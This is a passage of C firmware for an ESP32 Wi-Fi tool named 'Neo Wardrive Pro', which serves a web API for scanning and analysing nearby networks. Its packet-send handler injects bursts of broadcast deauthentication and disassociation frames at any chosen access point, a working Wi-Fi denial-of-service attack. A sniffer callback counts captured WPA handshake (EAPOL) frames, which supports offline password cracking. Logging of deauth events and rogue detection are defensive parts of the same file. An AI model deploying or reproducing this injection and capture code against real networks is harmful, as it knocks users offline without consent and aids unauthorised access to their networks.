    buf[len] = 0;

    char *bssid_str    = strstr(buf, "\"bssid\"");
    char *type_str     = strstr(buf, "\"type\"");
    char *count_str    = strstr(buf, "\"count\"");
    char *interval_str = strstr(buf, "\"interval\"");

    if (!bssid_str || !type_str || !count_str) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }

    char *bssid_val = strchr(bssid_str, ':');
    if (!bssid_val) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    bssid_val++;
    while (*bssid_val && (*bssid_val == ' ' || *bssid_val == '\"')) bssid_val++;
    char bssid[18];
    strncpy(bssid, bssid_val, 17);
    bssid[17] = 0;
    char *end = strchr(bssid, '\"');
    if (end) *end = 0;

    char *type_val = strchr(type_str, ':');
    if (!type_val) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    type_val++;
    while (*type_val && (*type_val == ' ' || *type_val == '\"')) type_val++;
    char packet_type[16];
    strncpy(packet_type, type_val, 15);
    packet_type[15] = 0;
    end = strchr(packet_type, '\"');
    if (end) *end = 0;

    char *count_val = strchr(count_str, ':');
    if (!count_val) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }
    int count = atoi(count_val + 1);

    int interval = 100;
    if (interval_str) {
        char *interval_val = strchr(interval_str, ':');
        if (interval_val) {
            interval = atoi(interval_val + 1);
        }
    }

    ESP_LOGI(TAG, "Packet send request: %s to %s, count=%d, interval=%d",
             packet_type, bssid, count, interval);

    uint8_t target_mac[6];
    str_to_mac(bssid, target_mac);

    uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

    // Try to move to the AP's channel for frame types that require being on-channel
    uint8_t original_primary;
    wifi_second_chan_t original_second;
    esp_wifi_get_channel(&original_primary, &original_second);

    uint8_t target_channel = 0;
    if (xSemaphoreTake(g_ap_mutex, pdMS_TO_TICKS(250)) == pdTRUE) {
        for (int i = 0; i < g_ap_count; i++) {
            ap_info_t *ap = &g_aps[i];
            if (ap->in_use && mac_equal(ap->bssid, target_mac)) {
                target_channel = ap->channel;
                break;
            }
        }
        xSemaphoreGive(g_ap_mutex);
    }

    if (target_channel > 0 && target_channel <= 14 && strcmp(packet_type, "probe") != 0) {
        esp_err_t ch_err = esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
        if (ch_err == ESP_OK) {
            ESP_LOGI(TAG, "Switched to channel %u for injection", (unsigned)target_channel);
        } else {
            ESP_LOGW(TAG, "Failed to switch channel to %u: %s", (unsigned)target_channel, esp_err_to_name(ch_err));
        }
    }

    wifi_mode_t old_mode;
    esp_wifi_get_mode(&old_mode);
    bool changed_mode = false;
    if (old_mode == WIFI_MODE_AP) {
        if (esp_wifi_set_mode(WIFI_MODE_APSTA) == ESP_OK) {
            changed_mode = true;
        }
    }

    uint8_t frame[128];
    size_t frame_len = 26;
    int sent = 0;
    int failed = 0;
    esp_err_t last_err = ESP_OK;

    for (int i = 0; i < count && i < 100; i++) {
        if (strcmp(packet_type, "deauth") == 0) {
            craft_deauth_frame(frame, broadcast, target_mac);
            frame_len = 26;
        } else if (strcmp(packet_type, "disassoc") == 0) {
            craft_disassoc_frame(frame, broadcast, target_mac);
            frame_len = 26;
        } else if (strcmp(packet_type, "probe") == 0) {
            craft_probe_request(frame, &frame_len, "test_probe");
        }

        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, frame_len, false);
        if (err == ESP_ERR_WIFI_IF) {
            err = esp_wifi_80211_tx(WIFI_IF_AP, frame, frame_len, false);
        }

        if (err == ESP_OK) {
            sent++;
            g_packet_stats.packets_sent++;
        } else {
            failed++;
            last_err = err;
            ESP_LOGW(TAG, "Packet TX failed (%s) on try %d", esp_err_to_name(err), i);
        }

        if (i < count - 1) {
            vTaskDelay(pdMS_TO_TICKS(interval));
        }
    }

    if (changed_mode) {
        esp_wifi_set_mode(old_mode);
    }

    if (target_channel > 0 && target_channel != original_primary) {
        esp_wifi_set_channel(original_primary, original_second);
        ESP_LOGI(TAG, "Restored channel to %u", (unsigned)original_primary);
    }

    char response[192];
    if (failed == 0) {
        snprintf(response, sizeof(response), "{\"status\":\"ok\",\"sent\":%d}", sent);
    } else {
        snprintf(response, sizeof(response),
                 "{\"status\":\"partial\",\"sent\":%d,\"failed\":%d,\"error\":\"%s\"}",
                 sent, failed, esp_err_to_name(last_err));
    }

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
}

static esp_err_t handler_api_handshake_start(httpd_req_t *req) {
    g_packet_stats.handshake_listening = true;
    g_packet_stats.handshake_captured = 0;
    update_promiscuous_filter();

    ESP_LOGI(TAG, "Handshake capture enabled");
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"status\":\"listening\"}", HTTPD_RESP_USE_STRLEN);
}

static esp_err_t handler_api_handshake_stop(httpd_req_t *req) {
    g_packet_stats.handshake_listening = false;
    update_promiscuous_filter();

    ESP_LOGI(TAG, "Handshake capture disabled");
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"status\":\"stopped\"}", HTTPD_RESP_USE_STRLEN);
}

static esp_err_t handler_api_handshake_status(httpd_req_t *req) {
    char buf[128];
    snprintf(buf, sizeof(buf),
             "{\"listening\":%s,\"captured\":%lu}",
             g_packet_stats.handshake_listening ? "true" : "false",
             (unsigned long)g_packet_stats.handshake_captured);

    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, buf, HTTPD_RESP_USE_STRLEN);
}

// ======================= WARDRIVE ON/OFF ==========================

static esp_err_t handler_api_wardrive_on(httpd_req_t *req) {
    g_wardrive_on = true;
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"status\":\"on\"}", HTTPD_RESP_USE_STRLEN);
}

static esp_err_t handler_api_wardrive_off(httpd_req_t *req) {
    g_wardrive_on = false;
    httpd_resp_set_type(req, "application/json");
    return httpd_resp_send(req, "{\"status\":\"off\"}", HTTPD_RESP_USE_STRLEN);
}

// ========================= HTTP SERVER =========================
static esp_err_t serve_index_html(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(
        req,
        (const char *)index_html_start,
        index_html_end - index_html_start
    );
}

static esp_err_t serve_glitch_css(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/css");
    return httpd_resp_send(
        req,
        (const char *)glitch_css_start,
        glitch_css_end - glitch_css_start
    );
}

static esp_err_t serve_app_js(httpd_req_t *req)
{
    httpd_resp_set_type(req, "application/javascript");
    return httpd_resp_send(
        req,
        (const char *)app_js_start,
        app_js_end - app_js_start
    );
}

static void start_webserver(void)
{
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.max_uri_handlers = 24;
    config.stack_size       = 8192;

    if (httpd_start(&g_httpd, &config) != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start HTTP server");
        return;
    }

    //
    httpd_uri_t uri_root           = { .uri = "/",                     .method = HTTP_GET,  .handler = handler_root };
    httpd_uri_t uri_api_aps        = { .uri = "/api/aps",              .method = HTTP_GET,  .handler = handler_api_aps };
    httpd_uri_t uri_api_state      = { .uri = "/api/state",            .method = HTTP_GET,  .handler = handler_api_state };
    httpd_uri_t uri_api_channels   = { .uri = "/api/channels",         .method = HTTP_GET,  .handler = handler_api_channels };
    httpd_uri_t uri_api_clear      = { .uri = "/api/aps/clear",        .method = HTTP_POST, .handler = handler_api_clear };
    httpd_uri_t uri_wardrive_on    = { .uri = "/api/wardrive/on",      .method = HTTP_POST, .handler = handler_api_wardrive_on };
    httpd_uri_t uri_wardrive_off   = { .uri = "/api/wardrive/off",     .method = HTTP_POST, .handler = handler_api_wardrive_off };
    httpd_uri_t uri_scan_once      = { .uri = "/api/scan/once",        .method = HTTP_POST, .handler = handler_api_scan_once };
    httpd_uri_t uri_export_csv     = { .uri = "/api/export/csv",       .method = HTTP_GET,  .handler = handler_api_export_csv };
    httpd_uri_t uri_security_analysis = { .uri = "/api/security/analysis", .method = HTTP_GET, .handler = handler_api_security_analysis };
    httpd_uri_t uri_channel_congestion = { .uri = "/api/security/congestion", .method = HTTP_GET, .handler = handler_api_channel_congestion };
    httpd_uri_t uri_rogue_detection = { .uri = "/api/security/rogues", .method = HTTP_GET,  .handler = handler_api_rogue_detection };
    httpd_uri_t uri_vulnerabilities = { .uri = "/api/security/vulnerabilities", .method = HTTP_GET, .handler = handler_api_vulnerabilities };
    httpd_uri_t uri_classifications = { .uri = "/api/classifications", .method = HTTP_GET,  .handler = handler_api_classifications };
    httpd_uri_t uri_deauth         = { .uri = "/api/security/deauth",  .method = HTTP_GET,  .handler = handler_api_deauth };
    httpd_uri_t uri_packets_send   = { .uri = "/api/packets/send",     .method = HTTP_POST, .handler = handler_api_packets_send };
    httpd_uri_t uri_handshake_start= { .uri = "/api/handshake/start",  .method = HTTP_POST, .handler = handler_api_handshake_start };
    httpd_uri_t uri_handshake_stop = { .uri = "/api/handshake/stop",   .method = HTTP_POST, .handler = handler_api_handshake_stop };
    httpd_uri_t uri_handshake_stat = { .uri = "/api/handshake/status", .method = HTTP_GET,  .handler = handler_api_handshake_status };
    //
    httpd_register_uri_handler(g_httpd, &uri_root);
    httpd_register_uri_handler(g_httpd, &uri_api_aps);
    httpd_register_uri_handler(g_httpd, &uri_api_state);
    httpd_register_uri_handler(g_httpd, &uri_api_channels);
    httpd_register_uri_handler(g_httpd, &uri_api_clear);
    httpd_register_uri_handler(g_httpd, &uri_wardrive_on);
    httpd_register_uri_handler(g_httpd, &uri_wardrive_off);
    httpd_register_uri_handler(g_httpd, &uri_scan_once);
    httpd_register_uri_handler(g_httpd, &uri_export_csv);
    httpd_register_uri_handler(g_httpd, &uri_security_analysis);
    httpd_register_uri_handler(g_httpd, &uri_channel_congestion);
    httpd_register_uri_handler(g_httpd, &uri_rogue_detection);
    httpd_register_uri_handler(g_httpd, &uri_vulnerabilities);
    httpd_register_uri_handler(g_httpd, &uri_classifications);
    httpd_register_uri_handler(g_httpd, &uri_deauth);
    httpd_register_uri_handler(g_httpd, &uri_packets_send);
    httpd_register_uri_handler(g_httpd, &uri_handshake_start);
    httpd_register_uri_handler(g_httpd, &uri_handshake_stop);
    httpd_register_uri_handler(g_httpd, &uri_handshake_stat);

    //
    // === STATIC ASSETS (no lambdas)
    //
    httpd_uri_t uri_index = {
        .uri      = "/",
        .method   = HTTP_GET,
        .handler  = serve_index_html,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(g_httpd, &uri_index);

    httpd_uri_t uri_css = {
        .uri      = "/glitch.css",
        .method   = HTTP_GET,
        .handler  = serve_glitch_css,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(g_httpd, &uri_css);

    httpd_uri_t uri_js = {
        .uri      = "/app.js",
        .method   = HTTP_GET,
        .handler  = serve_app_js,
        .user_ctx = NULL
    };
    httpd_register_uri_handler(g_httpd, &uri_js);

    ESP_LOGI(TAG, "Web server started with UI + API handlers");
}


static void stop_webserver(void) {
    if (g_httpd) {
        httpd_stop(g_httpd);
        g_httpd = NULL;
    }
}

/* ========================= PROMISCUOUS / DEAUTH LOGIC ========================= */

static void log_deauth_event(const uint8_t src[6], const uint8_t dst[6]) {
    uint32_t now = now_ms();

    for (int i = 0; i < 32; i++) {
        deauth_event_t *ev = &g_deauth_log[i];
        if (ev->count &&
            mac_equal(ev->src, src) &&
            mac_equal(ev->dst, dst)) {
            ev->count++;
            ev->last_time_ms = now;
            return;
        }
    }

    int idx = g_deauth_head++ & 31;
    deauth_event_t *ev = &g_deauth_log[idx];
    memset(ev, 0, sizeof(*ev));
    memcpy(ev->src, src, 6);
    memcpy(ev->dst, dst, 6);
    ev->count        = 1;
    ev->last_time_ms = now;
}

IRAM_ATTR static void wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *hdr = pkt->payload;

    uint8_t fc = hdr[0];
    uint8_t frame_type = (fc & 0x0C) >> 2; // 0=mgmt, 1=ctrl, 2=data

    if (type == WIFI_PKT_MGMT && ((fc & 0xF0) == 0xC0 || (fc & 0xF0) == 0xA0)) {
        const uint8_t *da = &hdr[4];
        const uint8_t *sa = &hdr[10];
        log_deauth_event(sa, da);
    }

    if (g_packet_stats.handshake_listening && frame_type == 2) { // data frame
        uint16_t len = pkt->rx_ctrl.sig_len;
        bool to_ds = fc & 0x01;
        bool from_ds = fc & 0x02;
        bool qos = fc & 0x80;

        int hdr_len = 24;
        if (to_ds && from_ds) {
            hdr_len = 30;
        }
        if (qos) {
            hdr_len += 2;
        }

        if (len > hdr_len + 8) {
            const uint8_t *llc = hdr + hdr_len;
            if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
                llc[6] == 0x88 && llc[7] == 0x8E) {
                g_packet_stats.handshake_captured++;
            }
        }
    }
}

/* ========================= WARDIVE TASK ========================= */

static void wardrive_task(void *arg) {
    while (1) {

        if (g_wardrive_on) {

            esp_err_t err = safe_scan_start();

            g_stats.total_scans++;

            if (err == ESP_OK) {
                g_stats.successful_scans++;
                update_ap_list_from_scan();
            } else {
                g_stats.failed_scans++;
                ESP_LOGW(TAG, "Background scan failed: %s", esp_err_to_name(err));
            }
        }

        // Random delay to avoid locking channel
        vTaskDelay(pdMS_TO_TICKS(SCAN_INTERVAL_MS + (esp_random() % 750)));
    }
}

/* ========================= WIFI INIT ========================= */

static void wifi_init(void) {
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    g_ap_netif  = esp_netif_create_default_wifi_ap();
    g_sta_netif = esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    wifi_config_t ap_cfg = {0};
    size_t       ssid_len = strlen(AP_SSID);
    size_t       pass_len = strlen(AP_PASS);

    if (ssid_len == 0 || ssid_len > sizeof(ap_cfg.ap.ssid) - 1) {
        ESP_LOGE(TAG, "Invalid AP SSID length: %zu", ssid_len);
        abort();
    }

    if (pass_len > sizeof(ap_cfg.ap.password) - 1) {
        ESP_LOGE(TAG, "Invalid AP password length: %zu", pass_len);
        abort();
    }

    strlcpy((char *)ap_cfg.ap.ssid, AP_SSID, sizeof(ap_cfg.ap.ssid));
    ap_cfg.ap.ssid_len       = ssid_len;
    ap_cfg.ap.channel        = 1;
    strlcpy((char *)ap_cfg.ap.password, AP_PASS, sizeof(ap_cfg.ap.password));
    ap_cfg.ap.max_connection = 4;
    ap_cfg.ap.authmode       = pass_len ? WIFI_AUTH_WPA_WPA2_PSK : WIFI_AUTH_OPEN;
    ap_cfg.ap.pmf_cfg.required = false;

    // ALWAYS use APSTA mode for wardrive scanning to work
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));

    // Configure empty STA (not connecting to anything, just enabling STA interface for scanning)
    wifi_config_t sta_cfg = {0};
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_cfg));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &sta_cfg));
    ESP_ERROR_CHECK(esp_wifi_start());

    esp_netif_ip_info_t ip_info = {
        .ip      = { .addr = esp_ip4addr_aton("192.168.4.1") },
        .netmask = { .addr = esp_ip4addr_aton("255.255.255.0") },
        .gw      = { .addr = esp_ip4addr_aton("0.0.0.0") },
    };

    ESP_ERROR_CHECK(esp_netif_dhcps_stop(g_ap_netif));
    ESP_ERROR_CHECK(esp_netif_set_ip_info(g_ap_netif, &ip_info));

    uint32_t dns_zero = 0;
    ESP_ERROR_CHECK(esp_netif_dhcps_option(
        g_ap_netif,
        ESP_NETIF_OP_SET,
        ESP_NETIF_DOMAIN_NAME_SERVER,
        &dns_zero,
        sizeof(dns_zero)
    ));

    ESP_ERROR_CHECK(esp_netif_dhcps_start(g_ap_netif));

    update_promiscuous_filter();
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    ESP_LOGI(TAG, "WiFi initialized in APSTA mode (AP SSID: %s)", AP_SSID);
}
/* ========================= APP MAIN ========================= */

void app_main(void) {
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES ||
        ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ESP_ERROR_CHECK(nvs_flash_init());
    }

    g_ap_mutex = xSemaphoreCreateMutex();
    if (!g_ap_mutex) {
        ESP_LOGE(TAG, "Failed to create AP mutex");
        return;
    }

    wifi_init();
    start_webserver();

    xTaskCreatePinnedToCore(
        wardrive_task,
        "wardrive_task",
        4096,
        NULL,
        5,
        NULL,
        tskNO_AFFINITY
    );

    ESP_LOGI(TAG, "Neo Wardrive Pro started");
}
